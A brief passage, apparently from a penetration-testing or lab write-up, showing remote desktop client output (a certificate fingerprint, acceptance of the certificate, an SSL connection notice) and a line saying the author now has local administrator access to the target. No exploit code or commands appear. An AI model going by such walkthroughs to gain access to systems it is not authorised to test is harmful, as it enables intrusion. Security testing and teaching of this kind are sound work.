     sha256: 3556cd6b7171d75fa2a737ceca4a69ba77583af6177683dbe099ad3dded93aa5


Do you trust this certificate (yes/no)? yes
Connection established using SSL.
Protocol(warning): process_pdu_logon(), Unhandled login infotype 1

If everything worked as expected, we have access to the system as a local administrator.
```
